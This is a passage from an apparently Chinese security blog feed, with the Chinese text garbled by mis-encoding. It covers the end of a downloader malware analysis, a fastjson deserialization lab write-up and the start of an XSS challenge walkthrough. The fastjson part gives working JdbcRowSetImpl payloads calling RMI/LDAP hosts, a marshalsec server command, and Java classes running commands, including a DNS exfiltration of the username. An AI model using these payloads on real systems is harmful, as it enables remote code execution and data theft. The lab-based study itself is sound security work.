title=""></a></h6><p>å¾€ä¸‹åˆ†æå‘ç°å¼€å§‹åˆå§‹åŒ–Windowsçš„Socketï¼Œå¹¶åˆå§‹åŒ–socketè¿æ¥ç”¨çš„å‚æ•°ï¼Œç«¯å£åœ°å€ï¼Œç½‘ç»œåœ°å€ï¼Œéšåå»åˆ¤æ–­è¿™ä¸ªç½‘ç»œåœ°å€æ˜¯å¦å­˜æ´»ï¼ŒæˆåŠŸäº†å°±å‘ä¸‹è·³è½¬</p><img src="/2024/03/04/Downloader%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/2024-03-04_14-34.png" class="" title="2024-03-04_14-34.png"><h6 id="-12"><a href="#-12" class="headerlink" title=""></a></h6><p>åé¢å°±æ˜¯å‘é€æ•°æ®äº†ï¼Œä¸éš¾å‘ç°ï¼Œå‘é€ä¸€ä¸ªGETçš„HTTPè¯·æ±‚ï¼Œè¯·æ±‚çš„åœ°å€åº”è¯¥å°±æ˜¯é‚£ä¸ªexeçš„URL</p><img src="/2024/03/04/Downloader%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/2024-03-04_14-41.png" class="" title="2024-03-04_14-41.png"><h6 id="-13"><a href="#-13" class="headerlink" title=""></a></h6><p>çœ‹åˆ°æœ€åå¯ä»¥å‘ç°ï¼Œæ¥æ”¶æœåŠ¡å™¨è¿”å›çš„æ•°æ®æ—¶ï¼Œä¼šå°†æ•°æ®ä¿å­˜å‚æ•°é‡Œï¼Œå¹¶ä¸”æ¥æ”¶çš„é•¿åº¦ä¹Ÿä¿å­˜äº†è¿›æ¥</p><img src="/2024/03/04/Downloader%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/2024-03-04_14-54.png" class="" title="2024-03-04_14-54.png"><h6 id="-14"><a href="#-14" class="headerlink" title=""></a></h6><h4 id="åˆ›å»ºæ–‡ä»¶è¡Œä¸ºåˆ†æ"><a href="#åˆ›å»ºæ–‡ä»¶è¡Œä¸ºåˆ†æ" class="headerlink" title="åˆ›å»ºæ–‡ä»¶è¡Œä¸ºåˆ†æ"></a>åˆ›å»ºæ–‡ä»¶è¡Œä¸ºåˆ†æ</h4><p>å†å¾€ä¸‹å®šä½å°±æ˜¯è¿™é‡Œï¼Œè¿™é‡Œçš„åŠŸèƒ½æ˜¯å®šä½æ¥æ”¶ç¼“å†²åŒºé‡Œéœ€è¦å†™å…¥åˆ°æ–‡ä»¶çš„ä½ç½®</p><img src="/2024/03/04/Downloader%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/2024-03-04_14-59.png" class="" title="2024-03-04_14-59.png"><h6 id="-15"><a href="#-15" class="headerlink" title=""></a></h6><p>å®šä½å®Œè¦å†™å…¥çš„ä½ç½®ä¹‹åï¼Œç´§æ¥ç€å°±æ˜¯åˆ›å»ºæ–‡ä»¶å’Œå†™å…¥æ–‡ä»¶äº†ï¼Œå†™å…¥ä½ç½®æ˜¯C:\dialler.exe</p><img src="/2024/03/04/Downloader%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/2024-03-04_15-09.png" class="" title="2024-03-04_15-09.png"><h6 id="-16"><a href="#-16" class="headerlink" title=""></a></h6><h4 id="æ‰§è¡Œæ–‡ä»¶è¡Œä¸ºåˆ†æ"><a href="#æ‰§è¡Œæ–‡ä»¶è¡Œä¸ºåˆ†æ" class="headerlink" title="æ‰§è¡Œæ–‡ä»¶è¡Œä¸ºåˆ†æ"></a>æ‰§è¡Œæ–‡ä»¶è¡Œä¸ºåˆ†æ</h4><p>æœ€åè°ƒç”¨çš„æ˜¯ShellExecuteAï¼Œå¹¶æ‰“å¼€è¿™ä¸ªæ–‡ä»¶ï¼Œå‚æ•°æ˜¯REFIDï¼Œå·¥ä½œç›®å½•æ˜¯C:\</p><img src="/2024/03/04/Downloader%E7%97%85%E6%AF%92%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/2024-03-04_15-15.png" class="" title="2024-03-04_15-15.png"><h6 id="-17"><a href="#-17" class="headerlink" title=""></a></h6>]]></content>
    
    
    <categories>
      
      <category>é€†å‘å·¥ç¨‹</category>
      
    </categories>
    
    
    <tags>
      
      <tag>æ ·æœ¬åˆ†æ</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>fastjsonæ¼æ´æ€»ç»“</title>
    <link href="/2024/03/03/fastjson%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
    <url>/2024/03/03/fastjson%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h2 id="ä»‹ç»"><a href="#ä»‹ç»" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h2><p>fastjsonæ˜¯ä¸€ä¸ªç”±é˜¿é‡Œå¼€å‘çš„ä¸€ä¸ªå¼€æºJavaç±»åº“ï¼Œå¯ä»¥å°†Javaå¯¹è±¡è½¬æ¢ä¸ºJSONæ ¼å¼(åºåˆ—åŒ–)ï¼Œå½“ç„¶å®ƒä¹Ÿå¯ä»¥å°†JSONå­—ç¬¦ä¸²è½¬æ¢ä¸ºJavaå¯¹è±¡ï¼ˆååºåˆ—åŒ–ï¼‰Fastjson å¯ä»¥æ“ä½œä»»ä½•Javaå¯¹è±¡ï¼Œå³ä½¿æ˜¯ä¸€äº›é¢„å…ˆå­˜åœ¨çš„æ²¡æœ‰æºç çš„å¯¹è±¡,ä½¿ç”¨è¿˜æ˜¯æ¯”è¾ƒå¹¿æ³›çš„</p><p>é‚£ä»€ä¹ˆæ˜¯json?<br>jsonæœ¬è´¨å°±æ˜¯ä¸€ç§å­—ç¬¦ä¸²ï¼Œç”¨äºä¿¡æ¯çš„å­˜å‚¨å’Œäº¤æ¢ã€‚jsonå…¨ç§°æ˜¯JavaScript object notationï¼Œå³JavaScriptå¯¹è±¡æ ‡è®°æ³•ï¼Œä½¿ç”¨é”®å€¼å¯¹è¿›è¡Œä¿¡æ¯çš„å­˜å‚¨ï¼Œä¸¾ä¸ªç®€å•çš„ä¾‹å­å¦‚ä¸‹</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs prolog">&#123;<br>        <span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;LiutyBlog&quot;</span>,<br>        <span class="hljs-string">&quot;age&quot;</span>:<span class="hljs-number">23</span>,<br>        <span class="hljs-string">&quot;media&quot;</span>:[<span class="hljs-string">&quot;CSDN&quot;</span>,<span class="hljs-string">&quot;bilibili&quot;</span>,<span class="hljs-string">&quot;Github&quot;</span>]<br>&#125;<br></code></pre></td></tr></table></figure><img src="/2024/03/03/fastjson%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/2024-03-03_21-02.png" class="" title="2024-03-03_21-02.png"><h6 id=""><a href="#" class="headerlink" title=""></a></h6><h2 id="ç›¸å…³æ¦‚å¿µ"><a href="#ç›¸å…³æ¦‚å¿µ" class="headerlink" title="ç›¸å…³æ¦‚å¿µ"></a>ç›¸å…³æ¦‚å¿µ</h2><p>åœ¨è¿›è¡Œfastjsonçš„æ¼æ´å¤ç°å­¦ä¹ ä¹‹å‰éœ€è¦äº†è§£å‡ ä¸ªæ¦‚å¿µ</p><h3 id="JNDI"><a href="#JNDI" class="headerlink" title="JNDI"></a>JNDI</h3><p>JNDIæ˜¯ä¸€ç»„åº”ç”¨ç¨‹åºæ¥å£ï¼Œæä¾›äº†æŸ¥æ‰¾å’Œè®¿é—®å‘½åå’Œç›®å½•æœåŠ¡çš„é€šç”¨ã€ç»Ÿä¸€çš„æ¥å£ï¼Œç”¨äºå®šä½ç½‘ç»œã€ç”¨æˆ·ã€å¯¹è±¡å’ŒæœåŠ¡ç­‰èµ„æºï¼Œæ˜¯J2EEè§„èŒƒä¸­æ˜¯é‡è¦çš„è§„èŒƒä¹‹ä¸€ï¼ŒJNDIåº•å±‚æ”¯æŒRMIè¿œç¨‹å¯¹è±¡ï¼ŒJNDIæ¥å£å¯ä»¥è®¿é—®å’Œè°ƒç”¨RMIæ³¨å†Œè¿‡çš„æœåŠ¡ï¼ŒJNDIæ ¹æ®åå­—åŠ¨æ€åŠ è½½æ•°æ®ï¼Œæ”¯æŒçš„æœåŠ¡æœ‰DNSã€LDAPã€CORBAã€RMI</p><h3 id="JNDIæ³¨å…¥"><a href="#JNDIæ³¨å…¥" class="headerlink" title="JNDIæ³¨å…¥"></a>JNDIæ³¨å…¥</h3><p>ç®€å•æ¥è¯´ï¼ŒJNDIæ¥å£åœ¨åˆå§‹åŒ–æ—¶ï¼Œå¯ä»¥å°†RMI URLä½œä¸ºå‚æ•°ä¼ å…¥ï¼Œè€ŒJNDIæ³¨å…¥å°±å‡ºç°åœ¨å®¢æˆ·ç«¯çš„lookup()å‡½æ•°ä¸­ï¼Œå¦‚æœlookup()çš„å‚æ•°å¯æ§å°±å¯èƒ½è¢«æ”»å‡»ï¼Œä¾‹å¦‚</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs haxe">Hashtable env = <span class="hljs-keyword">new</span><span class="hljs-type">Hashtable</span>();<br>env.put(Context.INITIAL_CONTEXT_FACTORY, <span class="hljs-string">&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;</span>);<br><span class="hljs-comment">//com.sun.jndi.rmi.registry.RegistryContextFactory æ˜¯RMI Registry Service Providerå¯¹åº”çš„Factory</span><br>env.put(Context.PROVIDER_URL, <span class="hljs-string">&quot;rmi://liuty_ip:8080&quot;</span>);<br>Context ctx = <span class="hljs-keyword">new</span><span class="hljs-type">InitialContext</span>(env);<br>Object local_obj = ctx.lookup(<span class="hljs-string">&quot;rmi://liuty_ip:8080/test&quot;</span>);<br></code></pre></td></tr></table></figure><h3 id="RMI"><a href="#RMI" class="headerlink" title="RMI"></a>RMI</h3><p>RMIæœåŠ¡ç«¯å¯ä»¥é€šè¿‡Referencesç±»æ¥ç»‘å®šä¸€ä¸ªå¤–éƒ¨çš„è¿œç¨‹å¯¹è±¡ï¼Œå½“RMIç»‘å®šäº†Referencesä¹‹åï¼Œé¦–å…ˆä¼šåˆ©ç”¨Referenceable.getReference()è·å–ç»‘å®šå¯¹è±¡çš„å¼•ç”¨ï¼Œå¹¶ä¸”åœ¨ç›®å½•ä¸­ä¿å­˜ï¼Œå½“å®¢æˆ·ç«¯ä½¿ç”¨lookupè·å–å¯¹åº”åå­—çš„æ—¶å€™ï¼Œä¼šè¿”å›ReferenceWrapperç±»çš„ä»£ç†æ–‡ä»¶ï¼Œç„¶åä¼šè°ƒç”¨getReference()è·å–Referenceç±»ï¼Œæœ€ç»ˆé€šè¿‡factoryç±»å°†Referenceè½¬æ¢ä¸ºå…·ä½“çš„å¯¹è±¡å®ä¾‹</p><p>ä»»ä½•å¯ä»¥è¢«è¿œç¨‹è°ƒç”¨æ–¹æ³•çš„å¯¹è±¡å¿…é¡»å®ç° java.rmi.Remoteæ¥å£ï¼Œè¿œç¨‹å¯¹è±¡çš„å®ç°ç±»å¿…é¡»ç»§æ‰¿UnicastRemoteObjectç±»,å¦‚æœä¸ç»§æ‰¿UnicastRemoteObjectç±»ï¼Œåˆ™éœ€è¦æ‰‹å·¥åˆå§‹åŒ–è¿œç¨‹å¯¹è±¡ï¼Œåœ¨è¿œç¨‹å¯¹è±¡çš„æ„é€ æ–¹æ³•çš„è°ƒç”¨UnicastRemoteObject.exportObject()é™æ€æ–¹æ³•,ä¾‹å¦‚</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs kotlin">publicclassByebyeImplimplementsIByebye&#123;<br>protectedByebyeImpl() throwsRemoteException&#123;<br>UnicastRemoteObject.exportObject(<span class="hljs-keyword">this</span>, <span class="hljs-number">0</span>);<br>&#125;<br><span class="hljs-meta">@Override</span><br>publicString sayByebye(String name) &#123;<br>System.<span class="hljs-keyword">out</span>.println(name);<br><span class="hljs-keyword">return</span> name;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="fastjsonååºåˆ—åŒ–æ¼æ´åŸç†"><a href="#fastjsonååºåˆ—åŒ–æ¼æ´åŸç†" class="headerlink" title="fastjsonååºåˆ—åŒ–æ¼æ´åŸç†"></a>fastjsonååºåˆ—åŒ–æ¼æ´åŸç†</h2><p>fastjsonçš„æ¼æ´æœ¬è´¨è¿˜æ˜¯ä¸€ä¸ªjavaçš„ååºåˆ—åŒ–æ¼æ´ï¼Œç”±äºå¼•è¿›äº†AutoTypeåŠŸèƒ½ï¼Œfastjsonåœ¨å¯¹jsonå­—ç¬¦ä¸²ååºåˆ—åŒ–çš„æ—¶å€™ï¼Œä¼šè¯»å–åˆ°@typeçš„å†…å®¹ï¼Œå°†jsonå†…å®¹ååºåˆ—åŒ–ä¸ºjavaå¯¹è±¡å¹¶è°ƒç”¨è¿™ä¸ªç±»çš„setteræ–¹æ³•ï¼Œfastjsonå¼•å…¥äº†AutoTypeï¼Œå³åœ¨åºåˆ—åŒ–çš„æ—¶å€™ï¼Œå…ˆæŠŠåŸå§‹ç±»å‹è®°å½•ä¸‹æ¥ã€‚ä½¿ç”¨@typeçš„é”®è®°å½•åŸå§‹ç±»å‹<br>ä½¿ç”¨autotypeå¤„ç†Jsonå¯¹è±¡çš„æ—¶å€™ï¼Œå¦‚æœæœªå¯¹@typeå­—æ®µè¿›è¡Œå®Œæ•´çš„å®‰å…¨æ€§éªŒè¯ï¼Œæ”»å‡»è€…å¯ä»¥ä¼ å…¥å±é™©ç±»ï¼Œå¹¶è°ƒç”¨å±é™©ç±»è¿æ¥è¿œç¨‹RMIä¸»æœºï¼Œé€šè¿‡å…¶ä¸­çš„æ¶æ„ç±»æ‰§è¡Œä»£ç ï¼Œæ”»å‡»è€…é€šè¿‡è¿™ç§æ–¹å¼å¯ä»¥å®ç°è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼Œè·å–æœåŠ¡å™¨æ•æ„Ÿä¿¡æ¯ï¼Œç”šè‡³å¯ä»¥åˆ©ç”¨æ­¤æ¼æ´è¿›ä¸€æ­¥çš„å¯¹æœåŠ¡å™¨æ•°æ®è¿›è¡Œæ“ä½œã€‚è¯´ç™½äº†å°±æ˜¯ï¼ŒFastJsonåœ¨è§£æjsonçš„è¿‡ç¨‹ä¸­ï¼Œæ”¯æŒä½¿ç”¨@typeå­—æ®µæ¥æŒ‡å®šååºåˆ—åŒ–çš„ç±»å‹ï¼Œå¹¶è°ƒç”¨è¯¥ç±»çš„setæˆ–getæ–¹æ³•æ¥è®¿é—®å±æ€§ï¼Œå½“ç»„ä»¶å¼€å¯äº†autotypeåŠŸèƒ½å¹¶ä¸”ååºåˆ—åŒ–ä¸å¯ä¿¡æ•°æ®æ—¶ï¼Œæ”»å‡»è€…å¯ä»¥æ„é€ æ•°æ®ï¼Œä»è€Œè¿›è¡Œè¿›ä¸€æ­¥çš„åˆ©ç”¨ï¼Œæˆ‘ç”¨pptå¤§æ¦‚åšä¸€ä¸ªæµç¨‹å›¾</p><img src="/2024/03/03/fastjson%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/2024-03-03_21-14.png" class="" title="2024-03-03_21-14.png"><h6 id="-1"><a href="#-1" class="headerlink" title=""></a></h6><h2 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h2><h3 id="1-2-24"><a href="#1-2-24" class="headerlink" title="1.2.24"></a>1.2.24</h3><p>æˆ‘è¿™é‡Œç”¨dockeræ­å»ºå¤ç°ç¯å¢ƒ</p><img src="/2024/03/03/fastjson%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/2024-03-02_15-14.png" class="" title="2024-03-02_15-14.png"><h6 id="-2"><a href="#-2" class="headerlink" title=""></a></h6><p>1.2.24æ˜¯æ²¡æœ‰ä»»ä½•fastjsonç‰¹å¾ï¼Œæˆ‘ä»¬æ„é€ æ•°æ®åŒ…ï¼Œç”¨POSTè¯·æ±‚ï¼Œå¹¶ä¸”åŠ ä¸ŠContent-Type: application&#x2F;json,å‘åŒ…å¯ä»¥è¯å® å•¥ç‰¹å¾æ²¡æœ‰</p><img src="/2024/03/03/fastjson%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/2024-03-03_20-29.png" class="" title="2024-03-03_20-29.png"><h6 id="-3"><a href="#-3" class="headerlink" title=""></a></h6><p>é¦–å…ˆç¼–è¯‘æ¶æ„ç±»ä»£ç ï¼Œæˆ‘ä»¬ä»¥åœ¨&#x2F;tmpç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªsuccessFrankæ–‡ä»¶ä¸ºå¤ç°æˆåŠŸæ ‡å¿—ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.lang.Runtime;<br><span class="hljs-keyword">import</span> java.lang.Process;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TouchFile</span> &#123;<br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Runtime</span> <span class="hljs-variable">rt</span> <span class="hljs-operator">=</span> Runtime.getRuntime();<br>            String[] commands = &#123;<span class="hljs-string">&quot;touch&quot;</span>, <span class="hljs-string">&quot;/tmp/successFrank&quot;</span>&#125;;<br>            <span class="hljs-type">Process</span> <span class="hljs-variable">pc</span> <span class="hljs-operator">=</span> rt.exec(commands);<br>            pc.waitFor();<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            <span class="hljs-comment">// do nothing</span><br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç„¶åç”¨javacç¼–è¯‘æˆclassæ–‡ä»¶ï¼Œç„¶ååœ¨å½“å‰ç›®å½•ç”¨pythonå¯åŠ¨ä¸€ä¸ªhttpæœåŠ¡ï¼Œè¿™ä¸ªæ—¶å€™å°±ç”¨åˆ°æˆ‘ä»¬çš„marshalsecï¼Œå¯åŠ¨ä¸€ä¸ªRMIæœåŠ¡å™¨ï¼Œè®¾ç½®ç›‘å¬ç«¯å£ï¼Œå¹¶åˆ¶å®šåŠ è½½è¿œç¨‹çš„æ¶æ„ç±»<br>ï¼ˆmarshalsecä¸‹è½½åœ°å€ï¼š<a href="https://github.com/mbechler/marshalsec.git">https://github.com/mbechler/marshalsec.git</a>)<br>(éœ€è¦æ‰‹åŠ¨mavenç¼–è¯‘æˆjaråŒ…ï¼‰</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">java</span> -cp marshalsec-<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">3</span>-SNAPSHOT-<span class="hljs-literal">all</span>.jar marshalsec.jndi.RMIRefServer <span class="hljs-string">&quot;http://liuty_ip:port/#TouchFile&quot;</span> <span class="hljs-number">9999</span>ï¼ˆæŒ‡å®šçš„ç«¯å£ï¼‰<br></code></pre></td></tr></table></figure><p>éšåæŠ“åŒ…ï¼ŒåŒæ ·ä½¿ç”¨POSTè¯·æ±‚ï¼Œå¹¶ä¸”åŠ ä¸ŠContent-Typeï¼Œåœ¨æœ€åè¾“å…¥payload</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;b&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;dataSourceName&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;rmi://liuty_ip:9999/TouchFile&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;autoCommit&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">true</span></span><br>    <span class="hljs-punctuation">&#125;</span><br><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>å‘é€æ•°æ®åŒ…</p><img src="/2024/03/03/fastjson%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/2024-03-03_19-33_1.png" class="" title="2024-03-03_19-33_1.png"><h6 id="-4"><a href="#-4" class="headerlink" title=""></a></h6><p>æ£€æµ‹ä¸€ä¸‹æ˜¯å¦åœ¨tmpç›®å½•touchåˆ›å»ºäº†æ–‡ä»¶successFrankå³å¯ï¼Œsuccess!</p><img src="/2024/03/03/fastjson%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/2024-03-03_16-58.png" class="" title="2024-03-03_16-58.png"><h6 id="-5"><a href="#-5" class="headerlink" title=""></a></h6><p>dnslogå›æ˜¾<br>åˆ›å»ºä¸€ä¸ªæ¶æ„ç±»ï¼Œæ‰§è¡Œpingå‘½ä»¤</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.lang.Runtime;<br><br><span class="hljs-keyword">import</span> java.lang.Process;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">dnslog</span>&#123;<br><br>    <span class="hljs-keyword">static</span> &#123;<br><br>        <span class="hljs-keyword">try</span> &#123;<br><br>            <span class="hljs-type">Runtime</span> <span class="hljs-variable">rt</span> <span class="hljs-operator">=</span> Runtime.getRuntime();<br><br>            String[] commands = &#123; <span class="hljs-string">&quot;/bin/sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, <span class="hljs-string">&quot;ping user.`whoami`.dnslogåœ°å€&quot;</span>&#125;;<br><br>            <span class="hljs-type">Process</span> <span class="hljs-variable">pc</span> <span class="hljs-operator">=</span> rt.exec(commands);<br><br>            pc.waitFor();<br><br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br><br>            <span class="hljs-comment">// 1</span><br><br>        &#125;<br><br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>æ­¥éª¤åŒä¸Šï¼Œä¿®æ”¹å®Œæ•°æ®åŒ…ä¹‹åï¼Œæ”¾åŒ… æˆåŠŸå›æ˜¾</p><img src="/2024/03/03/fastjson%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/2024-03-03_20-30.png" class="" title="2024-03-03_20-30.png"><h6 id="-6"><a href="#-6" class="headerlink" title=""></a></h6><img src="/2024/03/03/fastjson%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/2024-03-03_19-34.png" class="" title="2024-03-03_19-34.png"><h5 id="-7"><a href="#-7" class="headerlink" title=""></a></h5><h3 id="1-2-47"><a href="#1-2-47" class="headerlink" title="1.2.47"></a>1.2.47</h3><p>åœ¨47ç‰ˆæœ¬ä¸­æœ€æ˜æ˜¾çš„ç‚¹å°±æ˜¯jsonæŠ¥é”™ä¼šå‡ºç°fastjsonç‰¹å¾</p><img src="/2024/03/03/fastjson%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/2024-03-03_17-00.png" class="" title="2024-03-03_17-00.png"><h6 id="-8"><a href="#-8" class="headerlink" title=""></a></h6><p>dnslogå›æ˜¾<br>æ„é€ æ•°æ®åŒ…</p><img src="/2024/03/03/fastjson%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/2024-03-03_20-31.png" class="" title="2024-03-03_20-31.png"><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;dataSourceName&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;ldap://192.168.110.208:28888/Object&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;autoCommit&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><img src="/2024/03/03/fastjson%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/2024-03-03_20-38.png" class="" title="2024-03-03_20-38.png"><h6 id="-9"><a href="#-9" class="headerlink" title=""></a></h6><img src="/2024/03/03/fastjson%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/2024-03-03_20-36.png" class="" title="2024-03-03_20-36.png"><h6 id="-10"><a href="#-10" class="headerlink" title=""></a></h6><p>åå¼¹shell</p><img src="/2024/03/03/fastjson%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/2024-03-03_20-50.png" class="" title="2024-03-03_20-50.png"><h6 id="-11"><a href="#-11" class="headerlink" title=""></a></h6>]]></content>
    
    
    <categories>
      
      <category>æ¸—é€æµ‹è¯•</category>
      
    </categories>
    
    
    <tags>
      
      <tag>æ¼æ´æ€»ç»“</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ç©ä¸ªé—¯å…³å°æ¸¸æˆ</title>
    <link href="/2024/02/29/%E7%8E%A9%E4%B8%AA%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/"/>
    <url>/2024/02/29/%E7%8E%A9%E4%B8%AA%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/</url>
    
    <content type="html"><![CDATA[<p>æ˜¨å¤©ä¸­åˆç¡äº†ä¸€è§‰ï¼Œä¸€ä¸ªæœ‹å‹é‚€è¯·æˆ‘æ¥ç©ä¸€ä¸ªé—¯å…³æ¸¸æˆï¼Œå‘è¿‡æ¥ä¸€çœ‹æ˜¯ä¸€ä¸ªxssé—¯å…³å°æ¸¸æˆï¼Œè™½ç„¶æ—©æœ‰è€³é—»ï¼Œä½†æ˜¯è¯´å®è¯ä¸€æ¬¡ä¹Ÿæ²¡ç©è¿‡ï¼›æ­£å¥½ä¸‹åˆæ²¡ä»€ä¹ˆäº‹æƒ…ï¼Œå°±ç©ç©è¿™ä¸ªæ¸¸æˆï¼Œå°±å½“æ‰“å‘æ—¶é—´äº†..(çº¯ç©ç©ï¼Œæ¯•ç«Ÿä¸èƒ½è€½è¯¯æˆ‘åˆ·æŠ–éŸ³ğŸ˜Š)</p><p>ç¬¬ä¸€å…³</p><img src="/2024/02/29/%E7%8E%A9%E4%B8%AA%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/2024-02-29_08-01.png" class="" title="2024-02-29_08-01.png"><h6 id=""><a href="#" class="headerlink" title=""></a></h6><p>æ¯•ç«Ÿç¬¬ä¸€å…³ï¼Œä¼°è®¡æœ€ç®€å•ï¼Œæ€»ä¸èƒ½åœ¨ç¬¬ä¸€å…³çš„bosséƒ½æ‰“ä¸å‡ºè¡€å§ï¼Œç›´æ¥çœ‹æºç </p><img src="/2024/02/29/%E7%8E%A9%E4%B8%AA%E9%97%AF%E5%85%B3%E5%B0%8F%E6%B8%B8%E6%88%8F/2024-02-29_08-02.png" class="" title="2024-02-29_08-02.png"><h6 id="-1"><a href="#-1" class="headerlink" title=""></a></h6><p>æœç„¶æ‰€æœ‰ç¬¦å·éƒ½æ²¡è¿‡æ»¤ï¼Œä¹Ÿæ²¡æœ‰è½¬ä¹‰ï¼Œé‚£ä¸ç›´æ¥ä¸Špayload</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;xss&quot;</span>)</span><span 